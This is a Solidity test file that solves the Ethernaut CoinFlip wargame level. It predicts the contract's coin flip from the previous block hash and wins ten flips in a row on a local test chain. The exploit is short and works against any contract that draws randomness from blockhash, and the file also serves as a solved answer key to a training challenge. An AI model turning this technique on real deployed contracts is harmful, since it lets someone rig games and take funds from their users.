// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {CoinFlip, CoinFlipFactory} from "ethernaut/levels/CoinFlipFactory.sol";

contract CoinFlipLevel is SetUpLevelTest {
    CoinFlip internal coinFlip;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new CoinFlipFactory());
        super.setUp();
        coinFlip = CoinFlip(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        vm.roll(100);
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        for (uint256 i = 0; i < 10; ++i) {
            emit log_named_uint("block.number", block.number);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 cFlip = blockValue / FACTOR;
            bool side = cFlip == 1 ? true : false;
            assert(coinFlip.flip(side));
            vm.roll(block.number + 1);
        }
        vm.stopPrank();
    }
}
